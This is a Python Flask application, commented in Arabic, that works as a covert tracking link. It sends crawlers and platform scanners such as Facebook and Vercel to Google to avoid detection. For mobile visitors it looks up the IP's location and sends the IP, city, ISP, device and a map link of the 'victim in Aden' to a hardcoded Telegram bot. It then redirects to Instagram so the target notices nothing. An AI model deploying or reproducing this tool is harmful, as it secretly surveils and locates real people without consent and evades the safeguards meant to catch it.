from flask import Flask, request, redirect
import requests

app = Flask(__name__)

TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQSOzvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    requests.post(url, json=payload, timeout=5)

@app.route('/')
def logic():
    ua = request.headers.get('User-Agent', '').lower()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # --- تشريح تحركات الخلفية ---
    # إذا كان الزائر "بوت فيسبوك" أو "فيرسل" -> تمويه (Redirect لجوجل)
    if any(bot in ua for bot in ['facebook', 'vercel', 'bot', 'spider', 'crawler']):
        return redirect("https://www.google.com")

    # إذا كان الزائر "إنسان" (جهاز موبايل) -> تنفيذ الصيد
    if "mobile" in ua or "android" in ua or "iphone" in ua:
        try:
            r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
            # إنشاء رابط خريطة دقيق لبرج الاتصال في عدن
            google_maps = f"https://www.google.com/maps?q={r.get('lat')},{r.get('lon')}"
            
            report = (
                f"🚀 <b>تم اختراق الحماية! صيد حقيقي:</b>\n"
                f"🌐 <b>IP:</b> <code>{ip}</code>\n"
                f"📍 <b>الموقع:</b> {r.get('city')}, {r.get('country')}\n"
                f"🏢 <b>المزود:</b> {r.get('isp')}\n"
                f"📱 <b>الجهاز:</b> <code>{ua[:50]}...</code>\n"
                f"🗺️ <a href='{google_maps}'>موقع الضحية في عدن</a>"
            )
            send_to_telegram(report)
        except:
            pass

    # التحويل النهائي لإنستغرام لكي لا يشعر المستخدم بشيء
    return redirect("https://www.instagram.com")

if __name__ == '__main__':
    app.run()
